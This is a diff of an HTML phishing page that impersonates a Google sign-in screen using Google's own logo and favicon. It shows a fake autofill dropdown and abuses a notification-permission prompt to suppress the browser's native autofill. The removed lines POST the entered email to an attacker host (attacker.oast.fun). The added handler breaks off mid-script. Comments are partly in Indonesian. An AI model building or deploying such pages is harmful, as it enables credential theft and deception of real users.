@@ -1,31 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Login</title>
+  <meta charset="UTF-8" />
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    body {
+      font-family: Roboto, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+      width: 360px;
+      position: relative;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 75px;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: normal;
+      color: #202124;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 20px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 10px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    #fakeDropdown {
+      display: none;
+      position: absolute;
+      top: 155px;
+      left: 40px;
+      width: 280px;
+      background: white;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      z-index: 9999;
+    }
+    #fakeDropdown span {
+      display: block;
+      padding: 10px;
+      cursor: pointer;
+    }
+    #fakeDropdown span:hover {
+      background-color: #eee;
+    }
+  </style>
+</head>
 <body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+    </div>
+    <h1>Sign in</h1>
+    <p>to continue to Gmail</p>
+    <input type="email" id="emailInput" autocomplete="email" placeholder="Email or phone" />
+    <div id="fakeDropdown">
+      <span>youremail@gmail.com</span>
+      <span>alt.account@domain.com</span>
+    </div>
+    <button onclick="submitLogin()">Next</button>
+  </div>
 
-<input type="email" id="email" autocomplete="email" />
-<div id="fakeDropdown"> <!-- spoofed autofill entries --> </div>
-<script>
-  email.onfocus = () => {
-    setTimeout(() => {
-      Notification.requestPermission(); // Suppress native autofill dropdown
-      fakeDropdown.style.display = 'block';
-    }, 150);
-  };
+  <script>
+    const input = document.getElementById('emailInput');
+    const dropdown = document.getElementById('fakeDropdown');
 
-  fakeDropdown.onclick = () => {
-    setTimeout(() => {
-      fetch('https://attacker.oast.fun', {
-        method: 'POST',
-        body: JSON.stringify({ email: email.value })
-      });
-    }, 500); // cukup waktu autofill berjalan
-  };
-</script>
+    input.addEventListener('focus', () => {
+      // Fake prompt untuk menekan native autofill
+      setTimeout(() => {
+        Notification.requestPermission().then(() => {});
+      }, 150);
 
+      // Tampilkan dropdown palsu
+      setTimeout(() => {
+        dropdown.style.display = 'block';
+      }, 400);
+    });
 
-</body>
-</html>
+    dropdown.addEventListener('click', () => {
+      dropdown.style.display = 'none';
